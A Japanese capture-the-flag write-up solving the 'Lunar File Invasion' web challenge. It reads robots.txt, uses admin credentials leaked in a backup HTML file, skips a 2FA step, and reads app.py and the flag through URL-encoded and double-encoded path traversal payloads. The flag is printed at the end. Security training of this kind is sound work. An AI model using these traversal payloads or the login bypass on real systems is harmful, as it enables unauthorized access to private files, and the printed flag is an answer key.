## Lunar File Invasion
### 問題文
```
We recently started a new CMS, we've had issues with random bots scraping our pages but found a solution with robots! Anyways, besides that there are no new bug fixes. Enjoy our product!

Fuzzing is NOT allowed for this challenge, doing so will lead to IP rate limiting!

https://asteroid.sunshinectf.games
```

### 解き方(長いので簡潔に書いてます)
1. 問題文より、robots.txtにヒントがありそうなので確認する。
```
# don't need web scrapers scraping these sensitive files:

Disallow: /.gitignore_test
Disallow: /login
Disallow: /admin/dashboard
Disallow: /2FA
```
2. /.gitignore_test が怪しいのでアクセスして入手する。
```
# this tells the git CLI to ignore these files so they're not pushed to the repos by mistake.
# this is because Muhammad noticed there were temporary files being stored on the disk when being edited
# something about EMACs.

# From MUHAMMAD: please make sure to name this .gitignore or it will not work !!!!

# static files are stored in the /static directory.
/index/static/login.html~
/index/static/index.html~
/index/static/error.html~
```
3. とりあえず書いてあるhtml全てにアクセスしてみるとlogin.html~だけ入手できた。
4. robots.txtに`/admin/dashboard`とかいう怪しいページがあるのでアクセスしようとする。
5. loginページに遷移するのでlogin.html~に書いてあるユーザー名とパスでログインする。
```html
<label for="Email">Email</label>
<input value="admin@lunarfiles.muhammadali" type="text" name="email">
<label for="Password">Password</label>
<!-- just to save time while developing, make sure to remove this in prod !  -->
<input value="jEJ&(32)DMC<!*###" type="text" name="password">
```

6. 2ファクタ認証のワンタイムパッドを要求されるが、無視して`/admin/dashboard`にアクセスしようとすると`/admin/help`にアクセスできる。
7. ページ上部に「Manage Files」というページがあるのでアクセスする。
8. secret1.txt、secret2.txt、secret3.txtがあるので中身を確認するとsecret2.txtに`so we triggered IR, one of the attackers somehow got their hands on our /etc/passwd file because it's on every Linux machine.` と書いてあるのでパストラバーサルが利用できると推測できる。
9. また、ソースを確認すると以下の部分から`/admin/download/ファイル名`とすることでファイルを入手できそうなことがわかる。(ここまでできた)
```js
function fetchFileContent(filename) {
            // no need ot URLEncode this is JS argument being pssed in,
            // plug we already URLencoded via flask's | urlencode
            const viewUrl = `/admin/download/${filename}`;
            (以下略)
```
10. **app.pyがあることを推測し**、`/ /..//..//../app.py` をURLエンコードしたリンクでパストラバーサルを行う
```
https://asteroid.sunshinectf.games/admin/download/%20%2f..%2f%2f..%2f%2f..%2fapp.py
```

11. app.pyの以下の記述からflagの位置を特定する。
```py
with open("./FLAG/flag.txt", "r") as f:
    FLAG = f.read()
```
12. `.././.././../FLAG/flag.txt` を二重でURLエンコードしたリンクでパストラバーサルを行い、flag.txtを入手する

```
https://asteroid.sunshinectf.games/admin/download/..%252f.%252f..%252f.%252f..%252fFLAG%252fflag.txt
```
flag
```
sun{lfi_blacklists_ar3_sOo0o_2O16_8373uhdjehdugyedy89eudioje}
```
### 感想
app.pyの推測ができれば解けてた。
低評価多かった理由もなんとなくわかる